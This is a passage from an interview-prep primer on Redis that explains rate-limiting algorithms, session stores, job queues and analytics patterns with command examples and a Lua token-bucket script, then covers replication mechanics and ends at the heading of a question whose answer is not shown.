The everyday production patterns that make Redis the default "utility knife" of a backend: **rate limiting** (fixed-window, sliding-window log, sliding-window counter, token/leaky bucket), **session storage** (server-side sessions with TTLs), **job/task queues** (simple list queues, reliable queues with acking, delayed jobs), and a grab-bag of **common patterns** (leaderboards, counters/analytics, deduplication, autocomplete, presence, caching). The 16 questions here are practical and design-heavy — you'll be asked to *build* a correct rate limiter, choose a queue design, or pick the right structure for a leaderboard. The through-line is **atomicity**: nearly every one of these patterns has a check-then-act race that you close with `INCR`-then-check or a **Lua script**, and knowing *why* is the difference between a limiter that leaks and one that holds.

**Mental model**

Think of Redis as a box of **atomic data-structure operations with TTLs**, and most of these patterns as a thin recipe over one structure: a rate limiter is a *counter or a sorted set with expiry*; a session is a *string/hash with a sliding TTL*; a queue is a *list you push and pop*; a leaderboard is a *sorted set*; presence and DAU are *bitmaps*; unique counts are *HyperLogLog*. The engineering judgement is (1) picking the structure that matches the access pattern, (2) making the multi-step operations atomic so concurrent clients don't corrupt the invariant, and (3) knowing when the pattern outgrows Redis (a real message broker, a real database). Because Redis executes one command at a time, a single command is already atomic; the trap is *sequences* of commands (read a counter, decide, write it back) where two clients interleave. That's what Lua and `INCR`-style atomic primitives are for.

**Key terms**

- **Fixed-window counter** — `INCR` a per-window key with an `EXPIRE`; simple, but allows ~2× bursts at window edges.
- **Sliding-window log** — a ZSET of request timestamps; exact count in any window, higher memory.
- **Sliding-window counter** — weighted blend of current + previous fixed windows; cheap approximation.
- **Token bucket** — tokens refill at a rate up to a cap; each request spends one; smooths bursts, done atomically in Lua.
- **Leaky bucket** — requests queue and drain at a constant rate; shapes traffic to a steady output.
- **Session store** — server-side session data in Redis keyed by session id, with a TTL (often sliding).
- **Reliable queue** — a queue where in-flight jobs sit in a processing list until acked, so a crash doesn't lose them.
- **Delayed job** — a ZSET scored by due-time, polled with `ZRANGEBYSCORE` to release ready jobs.
- **HyperLogLog (HLL)** — probabilistic unique-count in ~12KB regardless of cardinality (`PFADD`/`PFCOUNT`).
- **Bitmap** — one bit per id (`SETBIT`/`BITCOUNT`); great for DAU, feature flags, presence.

**Why interviewers ask this**

These are the questions where interviewers see whether you've actually *run* Redis in production or just read about it. "Design a rate limiter" is nearly universal, and the tell is whether you spot the **check-then-increment race** and reach for `INCR`+`EXPIRE` or Lua, whether you know fixed-window's boundary-burst flaw, and whether you can weigh accuracy vs memory across the algorithms. Session and queue questions test whether you understand **why** Redis fits (fast, TTL, shared across a stateless app tier) and where it stops fitting (durable messaging → a broker). A senior answer names the trade-offs and the failure modes (lost jobs, thundering herd, stale sessions), not just the commands.

**Common confusions**

- "Fixed-window rate limiting is accurate" — it allows up to 2× the limit across a window boundary (a burst at the end of one window plus the start of the next).
- "A GET-then-SET counter is fine under load" — it races; two clients read the same value and both write, undercounting. Use `INCR` or Lua.
- "`LPUSH`/`RPOP` is a reliable queue" — it isn't; a crash between pop and processing **loses the job**. You need a processing list + ack.
- "Sessions in Redis are lost on restart" — only if you don't persist; with RDB/AOF they survive, and TTLs handle expiry either way.
- "Redis is a message broker" — Streams get close, but for durable, high-throughput, multi-consumer messaging a real broker (Kafka/RabbitMQ/SQS) is usually the right graduation.

**What follows from this topic**

These patterns lean on primitives from across the primer: the **atomicity** and **Lua** discipline is shared with the **Distributed Locks** topic (token buckets and safe-unlock are the same tool); leaderboards and ZSET-based limiters build on the sorted-set data-type topic; caching recaps the caching topic; and the durability of sessions and queues depends on the persistence (RDB/AOF) and **Replication** topics — a session store or queue is only as durable as the persistence and replication you've configured under it.

### Q1. Implement a fixed-window rate limiter and explain its flaw.

Count requests per (user, time-window) key; reject when the count exceeds the limit.

```bash
# key includes the window, e.g. the current minute
INCR ratelimit:user:123:202607030901
# on the first hit in this window, set the window to expire
EXPIRE ratelimit:user:123:202607030901 60
# if the returned value > limit -> reject (429)
```

Doing `INCR` first (which returns the new count) makes it atomic — no check-then-increment race. Set the TTL only when the counter is created (value == 1) so the window rolls over cleanly.

**The flaw — boundary bursts.** Windows are hard-edged. With a limit of 100/min, a client can send 100 requests at 12:00:59 and another 100 at 12:01:00 — **200 requests in ~1 second**, because they fall in two different windows. So fixed-window allows up to ~2× the limit across a boundary. It's simple and cheap (one counter), but if smoothness matters, use sliding-window or token bucket.

### Q2. Implement a sliding-window log limiter with a ZSET. What's the trade-off?

Store each request's timestamp as a member in a sorted set scored by time; the window is "the last N seconds", and you count members still inside it.

```bash
# drop entries older than the window (now - 60s)
ZREMRANGEBYSCORE ratelimit:user:123 0 <now_ms-60000>
# add this request (score and member = now, unique)
ZADD ratelimit:user:123 <now_ms> <now_ms-uuid>
# how many requests in the window?
ZCARD ratelimit:user:123
# set/refresh a TTL so idle users' sets get cleaned up
EXPIRE ratelimit:user:123 60
```

If `ZCARD` exceeds the limit, reject. Wrap these in a Lua script (or MULTI) so the trim/add/count is atomic.

**Trade-off:** it's **exact** — a true rolling window with no boundary burst — but it stores one member **per request**, so a high-rate key costs real memory and the `ZREMRANGEBYSCORE` does O(log N + M) work. Great for modest rates or when precision matters; expensive for very high throughput, where a counter-based approach is cheaper.

### Q3. Explain the sliding-window counter algorithm and why it's a good compromise.

It approximates a rolling window using just **two fixed-window counters** — the current window and the previous one — weighted by how far into the current window you are. If you're 30% into the current minute, you count all of the current window plus 70% of the previous window:

```
estimated = current_count + previous_count * (1 - elapsed_fraction_of_window)
```

Example: limit 100/min, previous minute saw 80, current minute so far 20, and you're 25% into the current minute → estimate = 20 + 80 × 0.75 = 80, still under 100.

Why it's a good compromise: it needs only **two counters per key** (tiny memory, like fixed-window) but **smooths the boundary burst** (much closer to a true sliding window). It's slightly approximate — it assumes the previous window's requests were uniformly distributed — but the error is small and bounded. This is what many production limiters (e.g. Cloudflare's) actually use because it hits the sweet spot of accuracy vs cost.

### Q4. Implement a token-bucket limiter in Lua and explain why Lua is required.

Token bucket: the bucket holds up to `capacity` tokens, refills at `rate` tokens/sec, each request spends one token; if empty, reject. You store the current token count and the last-refill timestamp, and on each request you lazily refill based on elapsed time.

```bash
EVAL "
local key = KEYS[1]
local rate = tonumber(ARGV[1])       -- tokens per second
local cap  = tonumber(ARGV[2])       -- bucket capacity
local now  = tonumber(ARGV[3])       -- current time (seconds)
local st   = redis.call('hmget', key, 'tokens', 'ts')
local tokens = tonumber(st[1]) or cap
local ts     = tonumber(st[2]) or now
tokens = math.min(cap, tokens + (now - ts) * rate)  -- refill
local allowed = tokens >= 1
if allowed then tokens = tokens - 1 end
redis.call('hmset', key, 'tokens', tokens, 'ts', now)
redis.call('expire', key, math.ceil(cap / rate) * 2)
return allowed and 1 or 0
" 1 ratelimit:tb:user:123 10 100 <now_seconds>
```

**Why Lua:** the operation is a **read-modify-write** across multiple fields (read tokens + ts, compute refill, decide, write back). Split across separate client commands, two concurrent requests both read the same token count and both decide "allowed", letting more through than the bucket permits. Redis runs a Lua script **atomically** (single-threaded, nothing interleaves), so the whole refill-check-decrement is one indivisible step. Token bucket is the standard robust choice because it smooths bursts (up to `capacity`) while enforcing a steady long-run `rate`.

### Q5. Token bucket vs leaky bucket — what's the difference?

Both bound the long-run rate; they differ in how they treat bursts.

| | Token bucket | Leaky bucket |
|---|---|---|
| Model | Tokens accrue up to a cap; each request spends one | Requests enter a queue that drains at a fixed rate |
| Bursts | **Allows** bursts up to `capacity` when tokens have accrued | **Smooths** — output is a constant drip regardless of input bursts |
| Overflow | No tokens → reject (or wait) | Queue full → reject |
| Feels like | "You've banked some allowance, spend it in a burst" | "Traffic shaping to a steady output" |
| Typical use | API rate limits that tolerate short bursts | Protecting a downstream that needs even, constant load |

Token bucket is the more common API-limiter choice because it's friendly to bursty-but-bounded clients. Leaky bucket is what you want when the thing you're protecting can only handle a **steady** rate and bursts must be flattened, not permitted. Both are implemented atomically in Redis (Lua), storing a small amount of state (tokens+timestamp, or queue length+last-leak time).

### Q6. Why does atomicity matter so much in rate limiting, and how do you get it?

Because every limiter is a **read-modify-write**: read the current count/tokens, decide allow/deny, write the new state. Under concurrency, two requests can read the same "99 of 100 used", both conclude "one slot left", and both proceed → 101 through. That leak defeats the whole point of the limiter, and it shows up exactly under the load where limiting matters most.

Two ways to get atomicity:
- **Atomic primitive** — use `INCR` (which reads-modifies-returns in one atomic op) then check the returned value, rather than GET/compute/SET. Fixed-window relies on this.
- **Lua script** — for anything multi-step (token bucket, sliding-window log's trim+add+count), wrap it in `EVAL`/`EVALSHA`; Redis runs the whole script without interleaving.

`MULTI`/`EXEC` also runs queued commands without interruption, but it can't branch on a value read mid-transaction (no "if count < limit then..."), so Lua is the general tool. The interview tell is spotting the race unprompted and naming `INCR`-then-check or Lua as the fix.

### Q7. How do you structure keys, TTLs, and responses for a production rate limiter?

**Keys** — scope the limiter to what you're protecting. Common granularities, often combined: per-user (`rl:user:123`), per-IP (`rl:ip:1.2.3.4`), per-endpoint (`rl:user:123:POST:/orders`), and sometimes tiered (a per-second and a per-day limit at once). Include the window in the key for fixed-window (`rl:user:123:<minute>`).

**TTLs** — always set an expiry so idle keys clean themselves up; there's no reason to keep a counter for a window that's over. For fixed-window, TTL = window length; for token bucket, a TTL comfortably longer than a full refill so state survives between requests but abandoned buckets expire.

**Response** — return **429 Too Many Requests** with headers so clients can behave: `X-RateLimit-Limit`, `X-RateLimit-Remaining` (from the returned count/tokens), and `Retry-After` / `X-RateLimit-Reset` (seconds until the window resets or a token is available). Returning remaining/retry-after turns a blunt reject into something clients can back off against gracefully.

### Q8. Design a session store in Redis. Why is Redis ideal for this?

Store server-side session data keyed by an opaque session id (from a cookie), with a TTL:

```bash
# on login: create the session with a 30-min TTL
SET session:abc123 '{"user":123,"role":"admin"}' EX 1800
# or as a hash for field-level access
HSET session:abc123 user 123 role admin
EXPIRE session:abc123 1800
# on each request: read it, and refresh the TTL (sliding expiry)
GET session:abc123
EXPIRE session:abc123 1800
# on logout: delete it
DEL session:abc123
```

**Sliding expiry** — resetting the TTL on each access keeps active users logged in and lets idle sessions expire automatically. **Logout** is just a `DEL`, which (unlike stateless JWTs) gives you real server-side invalidation.

**Why Redis is ideal:** it's **fast** (sessions are hit on every request, so sub-ms matters), it has **native TTLs** (expiry is the whole session-lifecycle model), and it's **shared across all app servers** — which lets the app tier stay **stateless** so any server can handle any request and you can scale/replace app nodes freely. That last point is the real win over in-process/sticky sessions.

### Q9. Redis sessions vs stateless JWTs — what's the trade-off?

**Server-side sessions (Redis):** the cookie holds only an opaque id; all data lives in Redis. Pros — you can **revoke instantly** (delete the key → logged out everywhere), change session data server-side, and keep tokens tiny. Cons — every request does a Redis lookup (a dependency and a bit of latency), and you must run/scale the session store.

**Stateless JWTs:** the token itself carries signed claims; the server verifies the signature and trusts the payload with **no lookup**. Pros — no per-request datastore hit, easy horizontal scale, works well across services. Cons — **revocation is hard**: a valid, unexpired JWT is accepted until it expires, so logout/ban needs a workaround (short expiry + refresh tokens, or a Redis **denylist** of revoked token ids — which reintroduces the lookup you were avoiding). Claims can also go stale (a role change isn't seen until the token refreshes).

Practical answer: use Redis sessions when **instant revocation and server-side control** matter (banking, admin, anything where "log this user out now" is a requirement); use JWTs for **scale and cross-service** auth where short-lived tokens make revocation lag acceptable. Many systems combine them: JWT access tokens plus a Redis-backed refresh-token/denylist.

### Q10. Build a simple job queue with lists. Why isn't it reliable?

A basic producer/consumer queue is two list operations:

```bash
# producer pushes a job onto the left
LPUSH queue:emails '{"to":"user@acme.test","tpl":"welcome"}'
# consumer blocks until a job is available, pops from the right (FIFO)
BRPOP queue:emails 0
```

`BRPOP` blocks efficiently (no polling) and `LPUSH`+`BRPOP` gives FIFO ordering. It's a perfectly good *simple* queue.

**Why it's not reliable:** `BRPOP` **removes** the job from Redis and hands it to the worker in one step. If the worker **crashes after popping but before finishing** the job (or the network drops), the job is **gone** — it's no longer in the queue and was never completed. There's no acknowledgement and no way to recover it. For at-most-once, best-effort work that's fine; for anything that must not be lost (payments, emails you promised to send), you need the reliable-queue pattern in the next question.

### Q11. Implement a reliable queue with acking. How does it prevent job loss?

Use an **atomic move** into a per-worker **processing list** instead of a destructive pop, then remove the job only after it's successfully handled (the ack):

```bash
# atomically move a job from the queue to this worker's processing list
LMOVE queue:emails processing:worker7 RIGHT LEFT
#   (RPOPLPUSH is the older equivalent)
# ... do the work ...
# on success, ack by removing it from the processing list
LREM processing:worker7 1 <job>
```

**Why no job is lost:** the job is **never absent** from Redis — it's atomically in either the main queue or a processing list. If the worker crashes mid-job, the job is still sitting in `processing:worker7`. A **reaper** process (or the worker on restart) scans processing lists for jobs older than some timeout and **`LMOVE`s them back** onto the main queue for retry. This turns at-most-once into **at-least-once** (a crashed job gets redelivered), so consumers must be **idempotent** to tolerate the occasional duplicate. This RPOPLPUSH/LMOVE pattern is the classic Redis reliable queue; Redis **Streams with consumer groups** provide the same idea (pending-entries list + `XACK`) with better ergonomics.

### Q12. How do you implement delayed / scheduled jobs in Redis?

Use a **sorted set scored by due-time** (a Unix timestamp). Enqueue a delayed job by adding it with its ready-at score; a poller repeatedly pulls everything whose score is now due:

```bash
# schedule a job to run at timestamp 1720000000
ZADD delayed:jobs 1720000000 '{"id":"job-42","task":"send-reminder"}'
# poller: fetch jobs due now or earlier
ZRANGEBYSCORE delayed:jobs 0 <now_ts> LIMIT 0 100
# atomically claim due jobs so two pollers don't double-run them (Lua):
#   ZRANGEBYSCORE ... then ZREM the claimed members, in one script
```

The poller runs on a short interval, moves due jobs onto the normal work queue (`LPUSH`) or processes them directly, and `ZREM`s them so they aren't picked up twice — do the fetch-and-remove atomically in Lua to avoid two pollers claiming the same job. This gives you delayed jobs, scheduled jobs, and retry-with-backoff (re-add with a future score) using one ZSET. For heavy scheduling loads or exactly-once semantics, graduate to a purpose-built scheduler or a broker with native delay support.

### Q13. When should a Redis queue graduate to Streams or a real broker?

Redis lists/reliable-queues are great for **simple, moderate-throughput** work where at-least-once with idempotent consumers is acceptable. Consider graduating when you need:

- **Consumer groups / fan-out** — multiple independent consumers each getting all messages, or a group load-balancing a stream with per-message acks and a pending list. **Redis Streams** (`XADD`/`XREADGROUP`/`XACK`) give this natively and are the natural next step while staying in Redis.
- **Durability & replay** — a persistent log you can re-read from an offset, long retention, replaying history. Streams help; **Kafka** is built for high-throughput durable logs and replay.
- **Complex routing / delivery guarantees / ops** — dead-letter queues, delayed delivery, priorities, exactly-once-ish semantics, mature tooling → **RabbitMQ** or **SQS**.
- **Very high throughput or large messages** — a dedicated broker (Kafka/SQS) is designed for it; Redis keeps everything in RAM, so a deep backlog is expensive.

Rule of thumb: **lists** for simple queues, **Streams** when you need consumer groups/acking/replay within Redis, a **real broker** (Kafka/RabbitMQ/SQS) when messaging is a first-class part of the architecture with strong durability, routing, or scale requirements.

### Q14. Walk through the common Redis patterns beyond caching and queues.

A quick tour, each mapping to one structure:

- **Leaderboards** — a **ZSET**: `ZADD leaderboard 4200 alice`, `ZINCRBY` to bump scores, `ZREVRANGE leaderboard 0 9 WITHSCORES` for the top 10, `ZREVRANK` for a player's rank. Ordered-by-score is exactly what a sorted set is.
- **Counters / real-time analytics** — `INCR page:views`, `INCRBY`. Atomic, O(1), perfect for high-frequency counting.
- **Unique counts** — **HyperLogLog**: `PFADD visitors:today <user>` then `PFCOUNT` for approximate uniques in ~12KB regardless of cardinality (small % error).
- **DAU / feature flags / presence** — **bitmaps**: `SETBIT active:2026-07-03 123 1` per active user, `BITCOUNT` for the daily total, `BITOP`/`BITCOUNT` across days for retention.
- **Deduplication / seen-sets** — a **SET** (`SADD seen <id>`, `SISMEMBER`) for exact membership, or a **Bloom filter** (RedisBloom `BF.ADD`/`BF.EXISTS`) when the set is huge and a tiny false-positive rate is acceptable.
- **Autocomplete / type-ahead** — `ZRANGEBYLEX` over a ZSET of terms for prefix matching.

The meta-point for interviews: name the structure that matches the access pattern, and note that all of these get their correctness under concurrency from atomic commands (or Lua for multi-step variants).

### Q15. Design a real-time analytics counter: uniques, totals, and DAU.

Say you need per-article **total views**, **unique viewers**, and site-wide **daily active users**. Use a different structure for each metric:

```bash
# total views: a plain atomic counter
INCR article:42:views
# unique viewers of the article (approximate, tiny memory): HyperLogLog
PFADD article:42:uniq <user_id>
PFCOUNT article:42:uniq
# daily active users: a bitmap, one bit per user id per day
SETBIT dau:2026-07-03 <user_id> 1
BITCOUNT dau:2026-07-03
# 7-day actives: OR the daily bitmaps then count
BITOP OR dau:week dau:2026-06-27 ... dau:2026-07-03
BITCOUNT dau:week
```

Why these choices: **`INCR`** is O(1) and atomic for high-frequency totals; **HyperLogLog** counts uniques in a fixed ~12KB with ~0.8% error instead of storing every id (a SET would be exact but could be gigabytes); **bitmaps** cost one bit per user (~125KB for a million users per day) and support fast set-algebra across days for DAU/WAU/retention. Set TTLs on the daily keys if you only need a rolling window. The lesson: match each metric to the cheapest structure that meets its accuracy requirement — exactness costs memory, and Redis gives you probabilistic structures precisely so you don't always pay it.

### Q16. How do you choose the right pattern, and when is Redis the wrong tool?

**Choosing:** start from the access pattern and pick the structure that matches it — ordered-by-score → ZSET (leaderboards, sliding-window, delayed jobs); membership → SET/Bloom; approximate uniques → HLL; per-id flags/DAU → bitmap; ephemeral keyed state with expiry → string/hash + TTL (sessions, fixed-window limiter); FIFO work → list (+ processing list for reliability). Then make any multi-step operation atomic with `INCR`-style primitives or Lua.

**When Redis is the wrong tool:**
- **Primary source of truth for critical data** — Redis is in-memory and (even with persistence) has a data-loss window on failover; a durable system of record wants a real database.
- **Data bigger than RAM** — everything lives in memory; a large dataset that doesn't fit is a poor fit (or needs Cluster + careful eviction).
- **Rich queries / joins / secondary indexes** — Redis has no ad-hoc query engine; if you need SQL-style querying, use a database (or RediSearch as a bolt-on, but know its limits).
- **Durable, high-volume messaging** — a real broker (Kafka/RabbitMQ/SQS) beats a Redis list/Stream at scale.
- **Strong cross-node consistency / correctness-critical locks** — async replication and the lock caveats from the **Distributed Locks** topic mean you may need ZooKeeper/etcd or a transactional DB.

The senior framing: Redis excels as a fast, ephemeral, structure-rich layer *beside* a durable store — caching, sessions, rate limits, queues, real-time counters — and you reach for something else the moment durability, query flexibility, or strong consistency becomes the primary requirement.

## Replication

### Summary

**What this topic covers**

How Redis copies a dataset from one **primary** (master) to one or more **replicas** (formerly "slaves") and what that buys you: read scaling, redundancy, and offloaded backups — plus the one property you must never forget, that replication is **asynchronous**, which opens a small **data-loss window** on failover. The 15 questions here cover the mechanics (full sync via RDB, then a continuous command stream; `PSYNC` and partial resync via the replication backlog; replication id + offset), the guarantees and non-guarantees (async ack, read-your-writes and stale-read caveats, `WAIT`, `min-replicas-to-write`), the operational knobs (diskless replication, chained replication, replica-read-only, lag monitoring), the classic **footguns** (a persistence-less replica restarting and wiping the primary), and how replication relates to the HA layers built on top of it — **Sentinel** and **Cluster**. The anchor question: "can Redis lose data on failover?" — and the honest answer is yes, and you must be able to say exactly why and how to narrow the window.

**Mental model**

Replication is a **one-directional stream of writes** from primary to replicas. A replica, on connect, gets a **point-in-time snapshot** to catch up (a full sync: the primary forks and produces an RDB, streams it, buffering any writes that arrive meanwhile), and thereafter **replays every write command** the primary executes, in order, forever. Think "the replica is continuously re-executing the primary's write log." The critical subtlety is **when the client is told the write succeeded**: the primary replies `OK` as soon as *it* has applied the write, **before** the replica has it. So there's always a gap where a write exists only on the primary. If the primary dies in that gap and a replica is promoted, that write is **gone**. Everything else — `WAIT`, `min-replicas-to-write`, Sentinel's failover logic — is about managing the size and consequences of that gap. Replication gives you eventual consistency, not linearizability.

**Key terms**

- **Primary / replica** — the write-accepting node vs the read-only copies (`replicaof`/`REPLICAOF host port`).
- **Full sync** — initial catch-up: primary `BGSAVE`s an RDB, streams it, then streams buffered writes.
- **Partial resync (`PSYNC`)** — after a brief disconnect, replica resumes from its offset using the backlog, avoiding a full resync.
- **Replication backlog** — an in-memory ring buffer of recent writes on the primary that enables partial resync.
- **Replication ID + offset** — identify the primary's history and how far a replica has consumed it.
- **Asynchronous replication** — primary acks the client before replicas confirm; the source of the data-loss window.
- **`WAIT numreplicas timeout`** — block until N replicas ack the writes so far; stronger durability, not full consistency.
- **`min-replicas-to-write` / `min-replicas-max-lag`** — refuse writes unless enough replicas are healthy/caught-up.
- **Diskless replication** (`repl-diskless-sync`) — stream the RDB straight over the socket, no disk write.
- **Replication lag** — how far behind a replica is (`master_repl_offset` vs the replica's offset).

**Why interviewers ask this**

Replication is where "Redis is just a cache" candidates get separated from people who've operated it. The question behind the question is usually **consistency and durability**: do you understand that async replication means failover can lose recently-acked writes? A junior says "Redis replicates so it's safe"; a senior says "it's asynchronous, so on primary failure the un-replicated tail is lost, and here's how I'd bound it (`WAIT`, `min-replicas-to-write`) and when that's not enough (use a real transactional store)." Interviewers also probe operational literacy — the persistence-less-replica-wipes-primary footgun, lag monitoring, diskless sync — because these are the things that actually cause outages. And replication is the foundation for the HA story (Sentinel/Cluster), so it's the natural lead-in to those.

**Common confusions**

- "Replication makes Redis durable / can't lose data" — no; async replication has a window where an acked write exists only on the primary and is lost if it dies before replicating.
- "`WAIT` gives strong consistency" — it strengthens *durability* (write reached N replicas) but doesn't make reads linearizable or fully prevent loss under all failures.
- "Reading from a replica is always fine" — replicas can **lag**, so you may read stale data or fail to read-your-own-writes.
- "A replica is a backup" — it mirrors the primary including deletions/flushes in real time; it's redundancy, not a point-in-time backup (use RDB snapshots for that).
- "Sentinel/Cluster *are* replication" — replication is the underlying data-copy mechanism; Sentinel and Cluster automate failover/sharding on top of it.

**What follows from this topic**

Replication is the substrate for the rest of Redis's availability and scale story. **Sentinel** automates failure detection and replica promotion over a replicated set; **Cluster** shards data across many primary/replica groups — both assume you understand the async-replication semantics here. The data-loss window explained in this topic is exactly the risk behind the **single-instance distributed lock losing safety on failover** (see the **Distributed Locks** topic) and behind treating Redis as a cache/side-store rather than a system of record (the caching and common-patterns topics). And the full-sync mechanism ties back to the persistence topic (RDB/AOF) — replication reuses the RDB snapshot machinery.

### Q1. What is Redis replication and what is it for?

Redis replication makes one or more **replicas** hold a live copy of a **primary's** dataset. You point a replica at a primary and it continuously receives the primary's writes:

```bash
# on the replica, at runtime or via config (replicaof host port)
REPLICAOF primary.internal 6379
```

Its three purposes:
- **Read scaling** — replicas are read-only copies, so you can fan read traffic out across them and keep the primary for writes. Good for read-heavy workloads.
- **Redundancy / HA** — if the primary dies, a replica already has (almost) all the data and can be **promoted** to primary, so you're not starting from cold.
- **Offloading work** — run **backups (RDB snapshots)** or heavy analytical reads on a replica so the primary isn't disturbed by the fork/CPU cost.

The one caveat to attach to all of this: replication is **asynchronous**, so a replica may be slightly behind, and failover can lose the most recent writes (covered in later questions).

### Q2. How does replication work under the hood — full sync then streaming?

Two phases. **Initial full sync:** when a replica connects (or reconnects and can't partial-resync), the primary runs `BGSAVE` — it `fork()`s a child that writes a point-in-time **RDB snapshot** — while **buffering** all new write commands that arrive during the save. It streams the finished RDB to the replica, which loads it, then streams the buffered writes so the replica catches up to "now".

**Continuous streaming:** from then on, every write the primary executes is propagated to each replica as part of a continuous **replication stream** (the write commands / their effects), which replicas apply in order. So a replica is perpetually replaying the primary's write log and stays nearly in sync.

Two refinements worth naming: with **diskless replication** the primary can stream the RDB straight over the socket instead of writing it to disk first, and **`PSYNC`** lets a replica that briefly disconnected resume from where it left off (partial resync) rather than redoing a full sync.

### Q3. Explain PSYNC, the replication backlog, and partial resync.

When a replica loses its connection to the primary for a **short** time (a blip, a brief network partition), redoing a full RDB sync would be wasteful. **`PSYNC`** avoids that. The primary keeps a **replication backlog** — an in-memory ring buffer of the most recent bytes of the replication stream. Each replica tracks its **offset** (how many bytes of the stream it has consumed) and the primary's **replication ID**.

On reconnect, the replica sends its last replication ID + offset. If that offset is **still within the backlog** and the replication ID matches, the primary does a **partial resync**: it just sends the missing slice of the stream from the replica's offset onward — cheap and fast. If the replica was gone **too long** (its offset fell out of the backlog) or the replication ID doesn't match (e.g. after a failover), the primary falls back to a **full resync**. Sizing `repl-backlog-size` big enough to cover expected disconnect durations is how you keep reconnects cheap.

### Q4. What are the replication ID and offset?

The **replication ID** identifies a particular **history** of the dataset — essentially "which primary's stream is this." The **offset** is a monotonically increasing byte count of how much of that stream has been produced (`master_repl_offset` on the primary) or consumed (on each replica). Together, (replication ID, offset) is a precise coordinate in the primary's write history.

They power partial resync: a replica reconnecting says "I'm at ID X, offset N" and the primary checks whether it can resume from there. They matter on **failover** too — when a replica is promoted, it takes on a new replication ID (while remembering the old one as a secondary ID) so other replicas can partial-resync against the new primary instead of full-syncing, if their offsets line up. Comparing `master_repl_offset` on the primary with a replica's offset is also the basic way to **measure replication lag**.

### Q5. Are replicas writable? Explain replica-read-only.

By default **no** — replicas are **read-only** (`replica-read-only yes`). They reject write commands with an error. This is deliberate and correct: a replica's job is to faithfully mirror the primary's stream, so allowing direct writes to a replica would create data that the primary doesn't have and that the next full resync would **silently wipe**, plus it would diverge the copies. Reads are fine and are the whole point of read scaling.

You *can* set `replica-read-only no` to allow writes to a replica, but you almost never should — those writes are local-only, ephemeral, and lost on any resync, and they confuse the mental model. If you find yourself wanting a writable replica, you probably want a separate primary (or Cluster sharding), not a hacked replica. The safe default is: **write to the primary, read from primaries or replicas.**

### Q6. Why is it critical that replication is asynchronous?

Because it defines Redis's **durability and consistency limits**. When a client sends a write, the primary applies it and **immediately replies `OK`** — it does **not** wait for any replica to confirm receipt. The write propagates to replicas afterward, in the background. That's great for latency (writes are fast, replicas don't slow the primary), but it means there is always a **window** in which an acknowledged write lives **only on the primary**.

If the primary **crashes during that window** and a replica is promoted, the promoted replica never received those last writes — so they are **permanently lost**, even though the client was told they succeeded. This is why Redis replication gives **eventual consistency**, not strong consistency, and why you can't treat a replicated Redis as a zero-data-loss system of record without extra measures. Every other tool in this topic (`WAIT`, `min-replicas-to-write`) exists to shrink or guard that async window.

### Q7. Can Redis lose data on failover? Explain exactly how.

**Yes.** Concrete sequence: a client writes `SET order:99 paid`; the primary applies it and returns `OK`; the client considers the order paid. A few milliseconds later — **before** that command has reached any replica — the primary's host dies. Sentinel (or Cluster) detects the failure and **promotes a replica**. That replica's most recent state didn't include `order:99 paid`, so after failover the key is **absent or stale**. The write is gone despite having been acknowledged.

The size of the window depends on replication lag (network, replica load) and how many writes the primary accepts per unit time. You can **narrow** it — `WAIT` to block until replicas ack, `min-replicas-to-write` to refuse writes when replicas are unhealthy, low-latency links — but you can't fully eliminate it with async replication. The correct interview answer is: **yes, Redis can lose the un-replicated tail of writes on failover; here's why (async ack) and here's how I'd bound the risk — and if zero loss is required, Redis isn't the system of record.**

### Q8. What does `WAIT` do and what are its limits?

`WAIT numreplicas timeout` **blocks the calling client** until at least `numreplicas` replicas have acknowledged all the writes the client has issued so far, or the timeout (ms) elapses; it returns the number of replicas that acked.

```bash
SET order:99 paid
WAIT 2 200     # block up to 200ms until 2 replicas confirm the write
```

Use it after a **critical write** to get stronger durability: once two replicas have it, a single primary failure won't lose it. Its **limits**:
- It's **not full consistency** — it confirms *durability* (the write reached N replicas), not linearizable reads; other clients can still see stale data on replicas.
- It **doesn't fully prevent loss** in every failure mode (e.g. a network partition where the acking replicas then also fail, or promotion of a replica that wasn't among the ackers).
- It **costs latency** — you've turned an async write into a partially-synchronous one, so use it selectively for writes that truly need it, not on the hot path.

It's a durability dial, not a consistency guarantee.

### Q9. What are the stale-read / read-your-writes caveats when reading from replicas?

Because replicas apply writes **after** the primary (replication lag), a read routed to a replica can return **stale** data — a value from a moment ago, or the absence of a key that was just written. Two concrete problems:

- **Read-your-writes violation** — a user updates their profile (write goes to the primary), then immediately reloads (read goes to a lagging replica) and sees the **old** profile. Confusing and bug-inducing.
- **Monotonic reads** — successive reads hitting different replicas with different lag can appear to go **backwards** in time.

Mitigations: route reads that must reflect a just-issued write to the **primary** (read-after-write to primary), pin a session to one replica for monotonicity, use `WAIT` to ensure the write propagated before reading a replica, or simply accept staleness for data where it doesn't matter (a cached count, a leaderboard). The senior point: replica reads are a **read-scaling** tool with a **consistency cost**, and you decide per-read whether that cost is acceptable.

### Q10. What do `min-replicas-to-write` and `min-replicas-max-lag` do?

They let the **primary refuse writes** when it doesn't have enough healthy replicas, trading availability for durability. `min-replicas-to-write N` means "only accept writes if at least N replicas are currently connected," and `min-replicas-max-lag S` means "only count replicas whose lag is at most S seconds." Together: accept writes only if **at least N replicas are within S seconds** of the primary; otherwise the primary starts rejecting writes.

```
min-replicas-to-write 1
min-replicas-max-lag 10
```

The point is to **shrink the data-loss window**: if the primary won't accept writes unless a caught-up replica exists to receive them, then a primary crash is far less likely to lose acknowledged writes (there was a fresh replica to promote). The cost is **availability** — if replicas are down or lagging, the primary stops taking writes, so you've chosen consistency/durability over uptime for that scenario. It's the CAP trade-off made explicit via config.

### Q11. What is diskless replication?

Normally a full sync has the primary write the RDB to **disk** (via the `BGSAVE` fork), then send that file to the replica. On systems with **slow disks** but a **fast network**, the disk write is the bottleneck. **Diskless replication** (`repl-diskless-sync yes`) has the forked child stream the RDB **directly over the socket** to the replica(s) without ever touching the primary's disk.

Benefits: faster syncs when disk is the constraint, and no disk I/O contention on the primary during a full sync. The trade-off / consideration: once the child starts streaming to a socket it can't easily "rewind," so if multiple replicas want to sync, the primary can wait a short configurable delay (`repl-diskless-sync-delay`) to batch them into one stream. There's also a diskless **load** option on the replica side (`repl-diskless-load`) to load the incoming RDB from the socket without staging it to disk, though it has its own risk trade-offs. In short: diskless sync optimises the full-resync path for fast-network/slow-disk environments.

### Q12. Explain the persistence-less-replica footgun that can wipe the primary.

